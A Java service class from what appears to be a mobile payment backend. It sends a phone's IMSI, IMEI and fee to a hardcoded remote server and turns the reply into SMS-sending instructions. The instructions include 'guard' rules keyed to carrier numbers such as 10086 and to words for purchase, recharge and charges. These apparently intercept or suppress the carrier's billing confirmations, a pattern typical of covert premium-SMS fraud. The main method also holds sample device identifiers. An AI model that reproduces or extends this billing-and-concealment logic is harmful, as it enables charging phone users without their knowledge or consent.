package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * http://119.29.98.244:8090/send?uid=100&fee=200&imei=867006010162492&imsi=460026764508764&appname=应用名称&subject=道具名称&param=xxxx
 * @author leoliu
 *
 */
public class HhkjWy2DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjWy2DynamicService.class);
	
	private static final String TYPE = "hhkjWy2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "uid={uid}&fee={fee}&imei={imei}&imsi={imsi}&appname=&subject=&param={param}";
	
	private static final Guard guard1 = new Guard("1065889955","成功|购买",1440,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String uid = map.get("uid");
			String imei = map.get("imei");
			String price = map.get("price");
			String province = map.get("province");
			
			if(province == null || province.length() == 0){
				province = "8611";
			}
			
			String param = REQUESTMODEL.replace("{imsi}",imsi).replace("{imei}",imei).replace("{uid}",uid).replace("{fee}",price).replace("{param}",province);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson,Map<String,String> map){
		
		if(responseJson != null && responseJson.length() > 0){
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status_code = jo.getString("status");
				
				if("1".equals(status_code)){
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(jo.getString("content"));
					sms.setSmsDest(jo.getString("port"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
					
					return XstreamHelper.toXml(smsList);					
				}				
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://119.29.98.244:8090/send?uid=100&fee=200&imei=867006010162492&imsi=460026764508764&appname=应用名称&subject=道具名称&param=xxxx
		
		String url = "http://119.29.98.244:8090/send";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imsi", "460025399810374");
		map.put("imei","862949029214504");
		map.put("type","hhkjWy2");
		map.put("uid", "320");
		map.put("price","800");
		map.put("province", "8661");
		
		System.out.println(new HhkjWy2DynamicService().dynamic(map));
		
	}

}
